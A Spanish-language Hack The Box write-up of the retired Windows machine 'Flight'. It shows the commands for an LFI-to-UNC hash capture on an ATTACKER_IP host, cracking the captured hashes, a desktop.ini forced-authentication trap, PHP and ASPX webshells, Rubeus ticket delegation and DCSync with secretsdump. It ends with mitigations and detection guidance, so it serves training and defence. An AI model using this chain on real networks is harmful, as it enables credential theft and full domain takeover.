---
machine: Flight
os: Windows
difficulty: Hard
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, active-directory, lfi, ntlm, dcsync]
---

# Flight — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, ficha publicable.
> Ficha de referencia basada en la documentación pública de HTB y writeups técnicos. Sin flags, credenciales ni hashes reales.

## TL;DR

Un LFI en `school.flight.htb` incluye una ruta UNC y obliga al servicio Apache a autenticarse contra SMB, lo que entrega el NetNTLMv2 de `svc_apache`. La contraseña se reutiliza en `S.Moon`, que puede escribir en `Shared`; un `desktop.ini` malicioso captura el hash de `C.Bum`. Con esas credenciales se escribe un webshell PHP en el sitio público y se obtiene ejecución como `svc_apache`. El siguiente salto es un IIS interno en `127.0.0.1:8000`: un webshell ASPX corre como `DefaultAppPool`, pide un TGT de la cuenta de máquina con Rubeus y ese ticket permite DCSync.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
53/tcp    domain
80/tcp    http    Apache 2.4.52 (Win64) PHP/8.1.1
88/tcp    kerberos-sec
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap
445/tcp   microsoft-ds
464/tcp   kpasswd5
593/tcp   http-rpc-epmap
636/tcp   ldapssl
5985/tcp  wsman
9389/tcp  adws
```

El conjunto de puertos y el dominio `flight.htb` identifican un controlador de dominio. El sitio principal es una web de aviación; el interés está en un vhost secundario.

## Enumeración

```bash
ffuf -u http://flight.htb/ -H 'Host: FUZZ.flight.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

`school.flight.htb` devuelve un portal PHP con `index.php?view=home.html`. El parámetro se concatena en una llamada de lectura de fichero, sin canonicalización, y acepta rutas UNC.

```text
http://school.flight.htb/index.php?view=home.html
```

## Foothold

Se arranca Responder y se apunta `view` a un recurso SMB propio:

```bash
sudo responder -I tun0
```

```text
http://school.flight.htb/index.php?view=//<ATTACKER_IP>/share/poc.txt
```

Windows intenta autenticarse en SMB y entrega un NetNTLMv2 de `svc_apache`. Se crackea fuera de línea:

```bash
hashcat -m 5600 svc_apache.txt /usr/share/wordlists/rockyou.txt
```

La contraseña obtenida se prueba contra los usuarios del dominio. `S.Moon` reutiliza la misma credencial.

```bash
nxc smb flight.htb -u svc_apache -p '<PASSWORD>' --users
nxc smb flight.htb -u S.Moon -p '<PASSWORD>' --shares
```

`S.Moon` tiene `READ,WRITE` sobre `Shared`. Se generan ficheros que fuerzan autenticación (por ejemplo, un `desktop.ini` con una ruta UNC) y se suben al share. Cuando `C.Bum` lo abre, Responder captura su NetNTLMv2; el crackeo da una segunda contraseña.

## Movimiento lateral

`C.Bum` tiene escritura sobre `Web`, que corresponde al docroot de Apache. Se sube un webshell PHP al directorio del vhost accesible:

```bash
smbclient //flight.htb/Web -U 'c.bum%<PASSWORD>'
# cd school.flight.htb\styles
# put shell.php
```

```text
http://school.flight.htb/styles/shell.php?cmd=whoami
# flight\svc_apache
```

`netstat` muestra un IIS escuchando solo en `127.0.0.1:8000`. Se crea un túnel inverso con Chisel y se accede al sitio interno. `C.Bum` puede escribir en su docroot; se sube un `.aspx` y se ejecuta como `IIS APPPOOL\DefaultAppPool`.

## Escalada de privilegios

La cuenta virtual de un app pool se autentica en red como la cuenta de máquina (`G0$`). Se sube Rubeus y se solicita un TGT con delegación falsa:

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

El ticket se convierte a ccache y se usa con Kerberos para DCSync:

```bash
kirbi2ccache ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass g0.flight.htb
```

Con el hash del Administrador se abre una shell con `psexec.py -hashes` o se reutiliza el ticket. La clave del box es que el ticket de la cuenta de máquina tiene privilegios suficientes para replicar el directorio.

## Evidencia

- Captura de Responder con el usuario y el reto NetNTLMv2, con el hash redactado.
- `whoami` como `svc_apache` y como `DefaultAppPool`.
- Salida de `secretsdump` recortada, sin hashes completos.

## Lecciones aprendidas

- Un LFI que solo "lee ficheros" puede convertirse en robo de credenciales si el proceso resuelve rutas UNC.
- La reutilización de contraseñas entre cuentas de servicio y usuarios humanos encadena dos saltos.
- Los shares escribibles son una superficie de autenticación forzada, no solo de almacenamiento.
- Un servicio en `localhost` sigue siendo alcanzable desde una shell de usuario; el túnel es el paso que falta.

## Mitigaciones y detección

- **Corrección:** canonicalizar y restringir `view` a una lista blanca de plantillas; ejecutar Apache con una cuenta de servicio sin acceso de red; deshabilitar NTLM donde sea posible; no reutilizar contraseñas; aplicar mínimo privilegio a las ACL de los shares;segmentar el IIS interno.
- **Detección:** eventos 4624/4625 con tipo 3 desde el host web; autenticaciones SMB salientes inesperadas; creación de `desktop.ini` en shares; procesos `w3wp.exe` que lanzan `cmd.exe` o `powershell.exe`; solicitudes `tgtdeleg` y DCSync (4662 sobre el objeto de dominio).
- MITRE ATT&CK: T1557.001 (LLMNR/NBT-NS poisoning and SMB relay), T1552.001 (credentials in files), T1003.006 (DCSync).

## Referencias

- <https://www.hackthebox.com/machines/Flight>
- <https://0xdf.gitlab.io/2023/05/06/htb-flight.html>
- <https://attack.mitre.org/techniques/T1557/001/>
- <https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview>
